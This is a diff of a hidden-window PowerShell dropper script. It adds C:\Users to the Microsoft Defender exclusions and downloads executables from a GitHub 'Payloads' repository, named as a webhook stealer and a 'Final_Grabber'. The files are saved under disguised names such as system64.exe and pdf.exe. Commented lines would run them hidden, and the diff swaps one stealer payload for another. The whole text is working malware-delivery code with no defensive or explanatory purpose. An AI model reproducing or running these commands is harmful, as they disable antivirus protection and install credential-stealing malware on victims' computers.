@@ -6,8 +6,8 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
 
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/blob/main/PD-webhook-Stealer.exe -o C:\Users\system64.exe
-# powershell.exe -w Hidden C:\Users\system64.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\pdf.exe
+# powershell.exe -w Hidden C:\Users\pdf.exe
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/PDF.exe -o C:\Users\PDF1.exe
 # powershell.exe -w Hidden C:\Users\PDF1.exe
